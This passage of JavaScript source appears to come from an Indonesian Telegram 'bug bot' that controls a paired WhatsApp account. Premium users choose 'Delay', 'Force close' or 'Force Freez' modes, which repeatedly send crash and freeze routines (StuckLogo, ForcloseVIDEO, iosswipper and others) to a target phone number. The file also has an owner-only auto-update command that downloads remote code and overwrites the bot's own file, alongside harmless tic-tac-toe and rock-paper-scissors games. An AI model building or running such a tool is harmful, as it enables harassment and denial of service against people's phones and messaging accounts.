  const data   = ctx.callbackQuery.data;

  if (!/^(delay|blank|bulldozer|fc)_/.test(data)) return;

  const [key, target] = data.split("_");

  if (clickedUsers[userId]) {
    return ctx.answerCbQuery("⚠️ Kamu sudah memilih tombol ini!", { show_alert: true });
  }

  clickedUsers[userId] = true;

  await ctx.answerCbQuery();
  await ctx.deleteMessage().catch(() => {});

  const methods = {
    delay: {
      name: "𝖣𝖾𝗅𝖺𝗒 𝖡𝗋𝗎𝗍𝖺𝗅𝗂𝗍𝗒",
      tasks: [
        { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target) },
        { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)    },
        { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target) },
        { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)    },
      ],
    },
    blank: {
      name: "XDioS",
      tasks: [
        { name: "catchingOs", fn: () => catchingOs(target)       },
        { name: "iosswipper", fn: () => iosswipper(sock, target) },
      ],
    },
    bulldozer: {
      name: "Force Freez",
      tasks: [
        { name: "VIDEO-1",        fn: () => ForcloseVIDEO(sock, target) },
        { name: "DOC-1",          fn: () => ForcloseDOC(sock, target)   },
        { name: "StuckNewAmba-1", fn: () => StuckNewAmba(sock, target)  },
        { name: "StuckLogo-1",    fn: () => StuckLogo(sock, target)     },
        { name: "StuckNewAmba-2", fn: () => StuckNewAmba(sock, target)  },
        { name: "StuckLogo-2",    fn: () => StuckLogo(sock, target)     },
        { name: "STC-1",          fn: () => ForcloseSTC(sock, target)   },
        { name: "VIDEO-2",        fn: () => ForcloseVIDEO(sock, target) },
      ],
    },
    fc: {
      name: "Force close",
      tasks: [
        { name: "VIDEO-1", fn: () => ForcloseVIDEO(sock, target) },
        { name: "DOC-1",   fn: () => ForcloseDOC(sock, target)   },
        { name: "STC-1",   fn: () => ForcloseSTC(sock, target)   },
        { name: "VIDEO-2", fn: () => ForcloseVIDEO(sock, target) },
      ],
    },
  };

  const method = methods[key];
  if (!method) return;

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  spamForever(ctx, method.name, target, method.tasks);
});

// =================== PAIRING ===================
bot.command("addpairing", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addpairing 62×××");
  const phone = args.replace(/[^0-9]/g, "");
  if (!phone) return ctx.reply("❌ ☇ Nomor gak valid.");
  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap.");
    if (sock.authState.creds.registered) return ctx.reply(`✅ ☇ WA udah terhubung ke ${phone}`);
    const code = await sock.requestPairingCode(phone, "1234GINA");
    const formatted = code?.match(/.{1,4}/g)?.join("-") || code;
    const caption = `
<blockquote><pre>
⬡═―—⊱ ⎧ HEFAISTOS HADES ⎭ ⊰―—═⬡
⌑ Number       : ${phone}
⌑ Pairing Code : ${formatted}
⌑ Status Bot   : Belum Terhubung
╘═——————————————═⬡
</pre></blockquote>`.trim();
    const sent = await ctx.replyWithPhoto(ThumbnailPairing, {
      caption, parse_mode: "HTML",
      reply_markup: { inline_keyboard: [[{ text: "SALIN CODE", copy_text: { text: formatted } }]] },
    });
    lastPairingMessage = { chatId: ctx.chat.id, messageId: sent.message_id, phoneNumber: phone, pairingCode: formatted };
  } catch (err) { console.error("addpairing err:", err.message); }
});

// =================== OWNER TOOLS ===================
bot.command("setcd", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");
  const s = parseInt(ctx.message.text.split(" ")[1]);
  if (isNaN(s) || s < 0) return ctx.reply("🪧 ☇ Format: /setcd 5");
  cooldown = s; saveCooldown(s);
  ctx.reply(`✅ ☇ Cooldown di-set ${s} detik.`);
});

bot.command("killsession", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");
  try {
    let deleted = false;
    for (const dir of ["./session", "./sessions"]) {
      if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); deleted = true; }
    }
    if (deleted) {
      await ctx.reply("✅ ☇ Session dihapus, panel restart...");
      setTimeout(() => process.exit(1), 2000);
    } else ctx.reply("🪧 ☇ Gak ada folder session.");
  } catch (err) { console.error(err); ctx.reply("❌ ☇ Gagal hapus session."); }
});

bot.command("addprem", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");
  const args = ctx.message.text.split(" ");
  let userId = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id.toString() : args[1];
  if (!userId || (!ctx.message.reply_to_message && args.length < 3)) return ctx.reply("🪧 ☇ Format: /addprem 12345678 30\nAtau reply user.");
  const dIdx = ctx.message.reply_to_message ? 1 : 2;
  const duration = parseInt(args[dIdx]);
  if (isNaN(duration)) return ctx.reply("🪧 ☇ Durasi harus angka (hari).");
  const exp = addPremUser(userId, duration);
  ctx.reply(`✅ ☇ ${userId} jadi premium sampai ${exp}`);
});

bot.command("delprem", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");
  const args = ctx.message.text.split(" ");
  const userId = ctx.message.reply_to_message ? ctx.message.reply_to_message.from.id.toString() : args[1];
  if (!userId) return ctx.reply("🪧 ☇ Format: /delprem 12345678 atau reply user.");
  removePremUser(userId);
  ctx.reply(`✅ ☇ ${userId} dihapus dari premium.`);
});

// =================== APPROVED GROUP ===================
bot.command("approved", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const chatId = ctx.message.text.split(" ").slice(1)[0];
  if (!chatId) return ctx.reply("🪧 Format: /approved -100xxxxxxxxxx");
  if (isGroupApproved(chatId)) return ctx.reply("⚠️ Udah di-approve.");
  approvedGroups.push(String(chatId)); saveApproved();
  if (pendingGroups.has(String(chatId))) { clearTimeout(pendingGroups.get(String(chatId)).timeout); pendingGroups.delete(String(chatId)); }
  try { await ctx.telegram.sendMessage(chatId, "✅ Grup ini sudah di-approve owner."); } catch {}
  ctx.reply(`✅ Grup ${chatId} di-approve.`);
});

bot.command("unapproved", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const chatId = ctx.message.text.split(" ").slice(1)[0];
  if (!chatId) return ctx.reply("🪧 Format: /unapproved -100xxxxxxxxxx");
  if (!isGroupApproved(chatId)) return ctx.reply("⚠️ Belum di-approve.");
  approvedGroups = approvedGroups.filter((x) => x !== String(chatId)); saveApproved();
  try { await ctx.telegram.sendMessage(chatId, "⚠️ Approval grup ini dicabut."); } catch {}
  ctx.reply(`✅ Approval grup ${chatId} dicabut.`);
});

bot.command("listapprovedgroup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  if (!approvedGroups.length) return ctx.reply("📭 Belum ada grup approved.");
  ctx.reply(`📋 Grup approved:\n\n${approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n")}`);
});

// =================== BLOCK COMMAND ===================
bot.command("blockcmd", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const cmd = normCmd(ctx.message.text.split(" ").slice(1)[0]);
  if (!cmd) return ctx.reply("🪧 Format: /blockcmd namacommand");
  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(cmd)) return ctx.reply("❌ Ini gak bisa diblokir.");
  if (blockedCommands.includes(cmd)) return ctx.reply(`⚠️ /${cmd} udah diblokir.`);
  blockedCommands.push(cmd); saveBlocked();
  ctx.reply(`✅ /${cmd} diblokir.`);
});

bot.command("unblockcmd", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const cmd = normCmd(ctx.message.text.split(" ").slice(1)[0]);
  if (!cmd) return ctx.reply("🪧 Format: /unblockcmd namacommand");
  if (!blockedCommands.includes(cmd)) return ctx.reply(`⚠️ /${cmd} gak diblokir.`);
  blockedCommands = blockedCommands.filter((x) => x !== cmd); saveBlocked();
  ctx.reply(`✅ /${cmd} dibuka.`);
});

bot.command("listblockcmd", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  if (!blockedCommands.length) return ctx.reply("✅ Gak ada command diblokir.");
  ctx.reply(`📋 Diblokir:\n\n${blockedCommands.map((c, i) => `${i + 1}. /${c}`).join("\n")}`);
});

// =================== PREMIUM GROUP CMD ===================
bot.command("addpremgrup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  if (ctx.chat?.type === "private") return ctx.reply("❌ Pakai di grup.");
  addPremGroup(ctx.chat.id);
  ctx.reply(`✅ ☇ <b>${esc(ctx.chat?.title || "Grup")}</b> masuk daftar premium.`, { parse_mode: "HTML" });
});

bot.command("delpremgrup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  if (ctx.chat?.type === "private") return ctx.reply("❌ Pakai di grup.");
  delPremGroup(ctx.chat.id);
  ctx.reply(`🗑 ☇ <b>${esc(ctx.chat?.title || "Grup")}</b> dihapus dari premium.`, { parse_mode: "HTML" });
});

bot.command("listpremgrup", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
  const d = loadPrem();
  if (!d.groups.length) return ctx.reply("📭 Belum ada grup premium.");
  ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${d.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n")}`, { parse_mode: "HTML" });
});

// =================== TIC TAC TOE ===================
const tttGames = new Map();
function tttWinner(b) {
  const L = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  for (const [a, b1, c] of L) if (b[a] && b[a] === b[b1] && b[a] === b[c]) return b[a];
  return null;
}
const tttDraw = (b) => b.every((v) => v) && !tttWinner(b);
const tttCell = (v) => (v === "X" ? "❌" : v === "O" ? "⭕" : "➖");
const tttName = (u) => (u?.username ? `@${u.username}` : u?.first_name || "User");
const tttKbd = (chatId, gid, b, lock = false) => {
  const btn = (i) => ({ text: tttCell(b[i]), callback_data: lock ? `tttnoop_${chatId}_${gid}` : `tttmove_${chatId}_${gid}_${i}` });
  return { inline_keyboard: [[btn(0), btn(1), btn(2)], [btn(3), btn(4), btn(5)], [btn(6), btn(7), btn(8)]] };
};

bot.command("ttt", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Cuma bisa di grup.");
  const chatId = ctx.chat.id;
  if (tttGames.has(chatId)) return ctx.reply("⚠️ Masih ada game jalan.");
  const gid = Date.now().toString().slice(-6);
  tttGames.set(chatId, { id: gid, board: Array(9).fill(null), players: { X: ctx.from, O: null }, turn: "X", started: false });
  await ctx.reply(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(ctx.from)}</b>\n⭕ O : <b>Belum join</b>\n\n<i>Klik tombol buat join.</i>`, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{ text: "⭕ Join Game", callback_data: `tttjoin_${chatId}_${gid}` }]] },
  });
});

bot.command("tttstop", async (ctx) => {
  if (!tttGames.has(ctx.chat.id)) return ctx.reply("❌ Gak ada game jalan.");
  tttGames.delete(ctx.chat.id);
  ctx.reply("🛑 Game TTT dihentikan.");
});

bot.command("mypoint", async (ctx) => {
  const row = getPoint(ctx.from.id);
  if (!row) return ctx.reply("📌 Belum punya point.");
  ctx.reply(`🏅 <b>MY POINT</b>\n\n👤 ${row.name}\n⭐ Point : <b>${row.points}</b>\n🏆 Win   : <b>${row.win}</b>\n🤝 Draw  : <b>${row.draw}</b>\n💀 Lose  : <b>${row.lose}</b>`, { parse_mode: "HTML" });
});

bot.command("leaderboard", async (ctx) => {
  const top = getTop(10);
  if (!top.length) return ctx.reply("📌 Leaderboard kosong.");
  ctx.reply(`🏆 <b>LEADERBOARD</b>\n\n${top.map((u, i) => `${i + 1}. <b>${u.name}</b> — ⭐ ${u.points} (W:${u.win} D:${u.draw} L:${u.lose})`).join("\n")}`, { parse_mode: "HTML" });
});

bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
    const g = tttGames.get(chatId);
    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ditemukan", { show_alert: true });
    if (g.players.O) return ctx.answerCbQuery("⚠️ Slot O penuh", { show_alert: true });
    if (g.players.X.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah X", { show_alert: true });
    g.players.O = ctx.from; g.started = true;
    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
    return ctx.answerCbQuery("✅ Join sebagai O");
  } catch { return ctx.answerCbQuery("❌ Error"); }
});

bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const idx = Number(ctx.match[3]);
    const g = tttGames.get(chatId);
    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ada", { show_alert: true });
    if (!g.started) return ctx.answerCbQuery("⚠️ Belum mulai", { show_alert: true });
    const cur = g.turn === "X" ? g.players.X : g.players.O;
    if (!cur || cur.id !== ctx.from.id) return ctx.answerCbQuery("❌ Bukan giliranmu", { show_alert: true });
    if (g.board[idx] !== null) return ctx.answerCbQuery("⚠️ Kotak terisi", { show_alert: true });
    g.board[idx] = g.turn;
    const w = tttWinner(g.board);
    if (w) {
      const wUser = w === "X" ? g.players.X : g.players.O;
      const lUser = w === "X" ? g.players.O : g.players.X;
      addWin(wUser); addLose(lUser);
      await ctx.editMessageText(`🏆 <b>MENANG: ${tttName(wUser)}</b> (${w})\n\n⭐ +3 point`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
      tttGames.delete(chatId);
      return ctx.answerCbQuery("🏆 Selesai");
    }
    if (tttDraw(g.board)) {
      addDraw(g.players.X); addDraw(g.players.O);
      await ctx.editMessageText(`🤝 <b>SERI</b>\n\n⭐ +1 point untuk berdua`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
      tttGames.delete(chatId);
      return ctx.answerCbQuery("🤝 Seri");
    }
    g.turn = g.turn === "X" ? "O" : "X";
    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
    return ctx.answerCbQuery("✅ Ok");
  } catch { return ctx.answerCbQuery("❌ Error"); }
});

bot.action(/^tttnoop_(.+)_(.+)$/, async (ctx) => ctx.answerCbQuery("⚠️ Game selesai"));

// =================== SUIT ===================
const suitGames = new Map();
const suitName = (u) => (u?.username ? `@${u.username}` : u?.first_name || "User");
const suitLabel = (c) => (c === "rock" ? "🪨 Batu" : c === "paper" ? "📄 Kertas" : c === "scissors" ? "✂️ Gunting" : "-");
function suitWin(a, b) {
  if (a === b) return "draw";
  if ((a === "rock" && b === "scissors") || (a === "paper" && b === "rock") || (a === "scissors" && b === "paper")) return "p1";
  return "p2";
}
const suitKbd = (chatId, gid) => ({
  inline_keyboard: [[
    { text: "🪨 Batu", callback_data: `suitpick_${chatId}_${gid}_rock` },
    { text: "📄 Kertas", callback_data: `suitpick_${chatId}_${gid}_paper` },
    { text: "✂️ Gunting", callback_data: `suitpick_${chatId}_${gid}_scissors` },
  ]],
});

bot.command("suit", async (ctx) => {
  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Cuma di grup.");
  const chatId = ctx.chat.id;
  if (suitGames.has(chatId)) return ctx.reply("⚠️ Masih ada game suit.");
  const gid = Date.now().toString().slice(-6);
  suitGames.set(chatId, { id: gid, p1: ctx.from, p2: null, p1Choice: null, p2Choice: null, started: false });
  await ctx.reply(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(ctx.from)}</b>\n👤 P2 : <b>Belum join</b>\n\n<i>Klik buat join.</i>`, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{ text: "⚔️ Join Suit", callback_data: `suitjoin_${chatId}_${gid}` }]] },
  });
});

bot.command("suitstop", async (ctx) => {
  if (!suitGames.has(ctx.chat.id)) return ctx.reply("❌ Gak ada game suit.");
  suitGames.delete(ctx.chat.id);
  ctx.reply("🛑 Game suit dibatalkan.");
});

bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
    const g = suitGames.get(chatId);
    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ada", { show_alert: true });
    if (g.p2) return ctx.answerCbQuery("⚠️ P2 penuh", { show_alert: true });
    if (g.p1.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah P1", { show_alert: true });
    g.p2 = ctx.from; g.started = true;
    await ctx.editMessageText(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(g.p1)}</b>\n👤 P2 : <b>${suitName(g.p2)}</b>\n\nPilih sekarang:`, { parse_mode: "HTML", reply_markup: suitKbd(chatId, gid) });
    return ctx.answerCbQuery("✅ Join sebagai P2");
  } catch { return ctx.answerCbQuery("❌ Error"); }
});

bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
  try {
    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const choice = String(ctx.match[3]);
    const g = suitGames.get(chatId);
    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ada", { show_alert: true });
    if (!g.started || !g.p2) return ctx.answerCbQuery("⚠️ Belum siap", { show_alert: true });

    if (ctx.from.id === g.p1.id) {
      if (g.p1Choice) return ctx.answerCbQuery("⚠️ Udah milih", { show_alert: true });
      g.p1Choice = choice;
      await ctx.answerCbQuery(`✅ Kamu pilih: ${suitLabel(choice)}`, { show_alert: true });
    } else if (ctx.from.id === g.p2.id) {
      if (g.p2Choice) return ctx.answerCbQuery("⚠️ Udah milih", { show_alert: true });
      g.p2Choice = choice;
      await ctx.answerCbQuery(`✅ Kamu pilih: ${suitLabel(choice)}`, { show_alert: true });
    } else return ctx.answerCbQuery("❌ Kamu bukan pemain", { show_alert: true });

    if (!g.p1Choice || !g.p2Choice) return;

    const res = suitWin(g.p1Choice, g.p2Choice);
    if (res === "draw") {
      addSuitDraw(g.p1); addSuitDraw(g.p2);
      await ctx.editMessageText(`🤝 <b>SERI</b>\n\n${suitName(g.p1)} = ${suitLabel(g.p1Choice)}\n${suitName(g.p2)} = ${suitLabel(g.p2Choice)}`, { parse_mode: "HTML" });
      suitGames.delete(chatId);
      return;
    }
    const winner = res === "p1" ? g.p1 : g.p2;
    const loser = res === "p1" ? g.p2 : g.p1;
    addSuitWin(winner); addSuitLose(loser);
    await ctx.editMessageText(`🏆 <b>MENANG: ${suitName(winner)}</b>\n\n${suitName(g.p1)} = ${suitLabel(g.p1Choice)}\n${suitName(g.p2)} = ${suitLabel(g.p2Choice)}\n\n⭐ +2 point`, { parse_mode: "HTML" });
    suitGames.delete(chatId);
  } catch { return ctx.answerCbQuery("❌ Error"); }
});

// =================== AUTO UPDATE ===================
const UPDATE_URL       = "https://raw.githubusercontent.com/sanz-max/seraphineupdate/main/files.js";
const UPDATE_FILE_PATH = "./files.js";
const BACKUP_FILE_PATH = "./files.backup.js";

bot.command("update", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");

  const chatId = ctx.chat.id;

  const sent = await ctx.telegram.sendMessage(chatId, `\`\`\`
⏳ Seraphine Update Script
━━━━━━━━━━━━━━━━━
[░░░░░░░░░░] 0%
Status: Initializing...
━━━━━━━━━━━━━━━━━
\`\`\``, { parse_mode: "Markdown" });

  const updateProgress = async (percent, status) => {
    const filled = Math.floor(percent / 10);
    const bar = "█".repeat(filled) + "░".repeat(10 - filled);
    await ctx.telegram.editMessageText(chatId, sent.message_id, null, `\`\`\`
⏳ Seraphine Update Script
━━━━━━━━━━━━━━━━━
[${bar}] ${percent}%
Status: ${status}
━━━━━━━━━━━━━━━━━
\`\`\``, { parse_mode: "Markdown" }).catch(() => {});
  };

  try {
    await updateProgress(20, "Preparing...");
    await sleep(500);

    await updateProgress(40, "Downloading...");
    const { data } = await axios.get(UPDATE_URL);
    if (!data) { await updateProgress(40, "❌ File is empty!"); return ctx.reply("❌ Update failed: File is empty!"); }

    await updateProgress(60, "Backing up...");
    await sleep(500);
    if (fs.existsSync(UPDATE_FILE_PATH)) fs.copyFileSync(UPDATE_FILE_PATH, BACKUP_FILE_PATH);

    await updateProgress(80, "Installing...");
    await sleep(500);
    fs.writeFileSync(UPDATE_FILE_PATH, data);

    await updateProgress(100, "Completed");
    await sleep(800);

    await ctx.reply(`✅ **Update Successful!**

━━━━━━━━━━━━━━━━━
📦 Backup    : files.backup.js
🔄 Status    : Restarting bot...
⏱ Time      : ${new Date().toLocaleString("en-US")}
━━━━━━━━━━━━━━━━━

_Bot will restart in 2 seconds..._`, { parse_mode: "Markdown" });

    setTimeout(() => process.exit(), 2000);
  } catch (e) {
    console.error("Update Error:", e);
    await ctx.telegram.editMessageText(chatId, sent.message_id, null, `\`\`\`
❌ UPDATE FAILED
━━━━━━━━━━━━━━━━━
[░░░░░░░░░░] ERROR
Status: ${e.message}
━━━━━━━━━━━━━━━━━
\`\`\``, { parse_mode: "Markdown" }).catch(() => {});
    await ctx.reply(`❌ **Update Failed!**\n\n**Error:** ${e.message}`, { parse_mode: "Markdown" });
  }
});

// =================== DETEKSI BOT JOIN GRUP ===================
bot.on("my_chat_member", async (ctx) => {
  try {
    const u = ctx.update.my_chat_member;
    const nw = u.new_chat_member.status;
    const old = u.old_chat_member.status;
    const chat = u.chat;
    if (chat.type !== "group" && chat.type !== "supergroup") return;

    const chatId = String(chat.id);
    const title = chat.title || "Tanpa Nama";

    if (["member", "administrator"].includes(nw) && ["left", "kicked"].includes(old)) {
      if (isGroupApproved(chatId)) return;

      await ctx.telegram.sendMessage(chat.id, "⚠️ Bot belum di-approve owner.\nJika 10 menit gak di-approve, bot keluar otomatis.");
      await ctx.telegram.sendMessage(ownerID, `🚨 BOT DITAMBAHKAN KE GRUP BARU\n\nNama : ${title}\nID   : ${chatId}\n\nGunakan:\n/approved ${chatId}`);

      if (pendingGroups.has(chatId)) clearTimeout(pendingGroups.get(chatId).timeout);
      const t = setTimeout(async () => {
        try {
          if (!isGroupApproved(chatId)) {
            await ctx.telegram.sendMessage(chat.id, "❌ Tidak di-approve 10 menit. Bot keluar.");
            await ctx.telegram.leaveChat(chat.id);
          }
        } catch {}
        finally { pendingGroups.delete(chatId); }
      }, 10 * 60 * 1000);

      pendingGroups.set(chatId, { title, timeout: t });
    }
  } catch (err) { console.error("my_chat_member err:", err.message); }
});

// =================== MIDDLEWARE GROUP ===================
bot.use(async (ctx, next) => {
  if (!ctx.chat) return next();
  const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
  if (!isGroup) return next();

  const chatId = String(ctx.chat.id);
  const text = ctx.message?.text || "";
  const cmd = text.startsWith("/") ? text.split(" ")[0].toLowerCase() : "";
  const bypass = ["/approved", "/unapproved", "/listapprovedgroup"];

  if (!isGroupApproved(chatId) && !bypass.includes(cmd)) {
    if (ctx.message?.text?.startsWith("/")) {
      await ctx.reply("❌ Grup ini belum di-approve owner.\n🪧 Format: /approved -100xxxxxxxxxx");
    }
    return;
  }
  return next();
});

// =================== MIDDLEWARE BLOCK CMD ===================
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();
  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) return next();

  const cmd = normCmd(text.split(" ")[0].split("@")[0]);
  const bypass = ["blockcmd", "unblockcmd", "listblockcmd"];
  if (!bypass.includes(cmd) && isBlocked(cmd)) {
    await ctx.reply(`❌ Command /${cmd} sedang diblokir.`);
    return;
  }
  return next();
});

// =================== LAUNCH ===================
bot.launch();
console.log(chalk.green("🚀 Bot Hefaistos Hades aktif!"));